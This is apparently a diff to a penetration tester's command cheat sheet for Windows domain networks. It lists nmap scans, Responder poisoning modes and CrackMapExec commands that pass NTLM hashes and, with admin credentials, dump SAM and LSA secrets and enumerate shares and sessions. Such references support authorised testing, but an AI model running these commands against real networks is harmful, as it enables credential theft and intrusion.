@@ -17,7 +17,7 @@ Full (Use alive hosts from GnmapParser as input) - nmap -Pn -n -sS -p- -sV --min
 --------------------
 Responder(old) -
 Analysis Mode - python Responder.py -I <interface> -A
-Business Mode - python Responder.py -I <interface> -r -d -w
+Business Mode - python Responder.py -I <interface> -rdwP
 Business Mode Proxy Auth - python Responder.py -I <interface> -P -v -r
 
 Relayx -
@@ -39,7 +39,7 @@ Check User Authentication via hash - cme smb -u <username> -H <ntlm> -d <domain>
 **ADMIN**
 cme smb -u <username> -p <password> -d <domain> <IP> --sam
 cme smb -u <username> -p <password> -d <domain> <IP> --lsa
-cme smb -u <username> -p <password> -d <domain> <IP> --shares
+cme smb -u <username> -p <password> -d <domain> --shares --kdcHost <DC IP> <Target IP>
 cme smb -u <username> -p <password> -d <domain> <IP> --sessions
 cme smb -u <username> -p <password> -d <domain> <IP> --loggedon-users
 cme smb -u <username> -p <password> -d <domain> <IP> --pass-pol
